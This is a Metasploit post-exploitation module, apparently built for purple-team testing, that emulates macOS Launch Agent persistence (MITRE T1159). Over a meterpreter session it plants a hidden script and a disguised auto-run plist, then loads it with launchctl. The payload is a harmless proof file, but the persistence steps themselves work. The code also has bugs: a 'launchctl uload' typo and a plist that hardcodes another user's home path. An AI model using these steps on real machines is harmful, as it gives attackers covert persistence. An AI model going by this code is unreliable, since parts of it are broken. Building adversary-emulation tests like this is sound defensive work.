##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Launch Agent (T1159) macOS - Purple Team',
      'Description'    => %q{
      Running this twice gets wonky. If you need to retest, run with the
      JUSTCLEANUP option set to true and then try again after that.

      Per Apple’s developer documentation, when a user logs in, a per-user
      launchd process is started which loads the parameters for each
      launch-on-demand user agent from the property list (plist) files found
      in /System/Library/LaunchAgents, /Library/LaunchAgents, and
      $HOME/Library/LaunchAgents (Citation: AppleDocs Launch Agent Daemons)
      (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware).
      These launch agents have property list files which point to the
      executables that will be launched (Citation: OSX.Dok Malware).
      Adversaries may install a new launch agent that can be configured to
      execute at login by using launchd or launchctl to load a plist into the
      appropriate directories (Citation: Sofacy Komplex Trojan) (Citation:
      Methods of Mac Malware Persistence). The agent name may be disguised
      by using a name from a related operating system or benign software.
      Launch Agents are created with user level privileges and are executed
      with the privileges of the user when they log in (Citation: OSX Malware
      Detection) (Citation: OceanLotus for OS X). They can be set up to
      execute when a specific user logs in (in the specific user’s directory
      structure) or when any user logs in (which requires administrator
      privileges).
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Praetorian' ],
      'Platform'       => [ 'osx' ],
      'References'     => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1159' ] ],
      'SessionTypes'   => [ 'meterpreter' ]))
    register_options(
      [
        OptString.new("PROOFFILE", [true, "The path to write the test proof file to.", "~/t1159.txt"]),
        OptBool.new("CLEANUP", [true, "Cleanup artifacts or not.", true]),
        OptBool.new("JUSTCLEANUP", [true, "Only perform cleanup actions.", false])
      ])
  end

  def clean
    print_status("Cleaning up artifacts")

    cmd = "launchctl uload -w ~/Library/LaunchAgents/com.t1159.plist || echo fail"
    unload = cmd_exec(cmd)
    cmd = "launchctl remove com.client.client || echo fail"
    remove = cmd_exec(cmd)
    # Test for success
    if (unload.include? 'fail') && (remove.include? 'fail')
      print_error("Failed to unload launch agent")
    end

    cmd = "rm ~/Library/LaunchAgents/com.t1159.plist || echo fail"
    rm_plist = cmd_exec(cmd)
    # Test for success
    if rm_plist.include? 'fail'
      print_error("Failed to remove plist file")
    end

    cmd = "rm ~/.t1159 || echo fail"
    rm_script = cmd_exec(cmd)
    # Test for success
    if rm_script.include? 'fail'
      print_error("Failed to remove script file (~/.t1159)")
    end

    cmd = "rm #{datastore['PROOFFILE']} || echo fail"
    rm_proof = cmd_exec(cmd)
    # Test for success
    if rm_proof.include? 'fail'
      print_error("Failed to remove proof file")
    end

    print_status("Cleanup complete")

  end

  def run
    return 0 if session.type != "meterpreter"

    prooffile = datastore['PROOFFILE']

    if datastore['JUSTCLEANUP'] == true
      clean
      return
    end

    # Module starting
    print_status("Attempting to register a new Launch Agent")

    # Create file the the PLIST Launch Agent will run
    print_status("Creating '.t1159' file to have the Launch Agent run")
    cmd = "echo \"osascript -e \'do shell script \\\"echo T1159 > #{prooffile}\\\"\'\" > ~/.t1159 || echo fail"
    create_script = cmd_exec(cmd)
    cmd = "chmod +x ~/.t1159 || echo fail"
    set_execute = cmd_exec(cmd)
    # Test for success
    if (create_script.include? 'fail') || (set_execute.include? 'fail')
      print_error("Failed to create the script file...exiting")
      print_error(create_script)
      print_error(set_execute)
      return
    end

    # Create PLIST Launch Agent file
    print_status("Creating .plist file to run with Launch Agent")
    plist = %q(
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
        <key>KeepAlive</key>
        <true/>
        <key>Label</key>
        <string>com.client.client</string>
        <key>ProgramArguments</key>
        <array>
        <string>/Users/jamesholden/.t1159</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>NSUIElement</key>
        <string>1</string>
      </dict>
    </plist>
    )
    cmd = "cat <<EOT >> ~/Library/LaunchAgents/com.t1159.plist #{plist} EOT || echo fail"
    create_plist = cmd_exec(cmd)
    # Test for success
    if create_plist.include? 'fail'
      print_error("Failed to create the PLIST file...exiting")
      print_error(create_plist)
      return
    end

    # Run the PLIST file with Launch Agent
    print_status("Executing payload. You should see a Finder popup and a a file written to ~/t1159.txt")
    cmd = "launchctl load -w ~/Library/LaunchAgents/com.t1159.plist || echo fail"
    run_it = cmd_exec(cmd)
    # Test for success
    if run_it.include? 'fail'
      print_error("Failed to run the payload...exiting")
      print_error(run_it)
      return
    end

    # Check for overall success
    cmd = "ls #{prooffile} || echo fail"
    test_success = cmd_exec(cmd)
    if test_success.include? "fail"
      print_error("Proof file not found, tactic failed...exiting")
      clean if datastore['CLEANUP'] == true
      return
    end

    print_good("Proof file found. Module finished with success!")

    clean if datastore['CLEANUP'] == true
  end
end
